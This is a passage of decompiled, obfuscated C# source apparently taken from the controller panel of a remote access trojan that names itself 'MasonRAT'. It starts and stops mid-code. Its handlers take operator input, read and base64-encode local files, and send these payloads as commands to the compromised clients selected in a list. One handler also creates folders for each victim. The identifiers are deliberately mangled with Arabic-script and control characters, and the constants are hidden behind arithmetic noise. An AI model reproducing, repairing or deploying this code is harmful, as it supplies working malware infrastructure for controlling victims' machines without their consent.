\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1577) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1578))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1579))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cٻـﻻ\u060Aـ\u060D\u0609\u0609ـڇ\u060Eـ̍ۡ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1580), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1581), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1582), (1365767080 - 543241195 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ ~((-231724477 ^ ~1019832833) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), (-1411291011 - (434016756 | 1368739020) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > (1312354387 - (1423817922 >> 1551020917) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) ? 278820207 - 278820208 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : (-1575837696 ^ (1563249021 | 499933107)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1583) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1584))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1585))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cا\u060A\u060Cۛ\u060Aدط\u0609بـۡﻋ\u060Aـ\u060A(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1586), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1587), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1588), (627020221 - -559991351 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + -(2031989918 - 844978345 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, (953505616 > 454533117 ? -1267121128 : -1689494837) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((-564472685 ^ ~1780715659) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1589) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1590))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1591))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608\u0608ـﯧ\u060Bٺ\u060A\u060A\u060Bمٺـڕ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1592) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1593))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cح\u060Aـ\u060A\u0020اـٸ\u060Cْٸـ\u060Bؤ\u060Cـ\u060B\u0608(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060E\u060Fة\u060Dٽـ\u060Dۛحـﻼ\u060Dــ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1594) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1595))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0608ٽـ\u060Aۧ\u0609ٻ\u060F\u060Dٸ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1596));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cةـڜ\u0609مٺگٺب\u0020ۧ\u060C\u060B(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C̍\u0608ۭ\u060Dڠٻٻ\u060Bټۭـ\u060Aـۡٺ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1597));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cىﻻﻋ\u0609ڕڼـ\u0609\u060F\u0609طـ\u0020(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1598));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cــڙـ\u0609\u060A\u060A\u0608ئئۡؤ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1599)))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1600));
      if (!Directory.Exists(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1601) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[(-487492911 - 1693287360 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > 1526651475 + (325660907 >> 1074887063) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? (1615936 ^ 1654721368 >> 914166058) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : (34569457 ^ 1643241455 % 402167999) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0].Text))
        Directory.CreateDirectory(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1602) + this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems[0].SubItems[(568006667 - ~1848051945 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (-741791188 - -2016452060 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 | 146363117 - ~630948895 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0].Text);
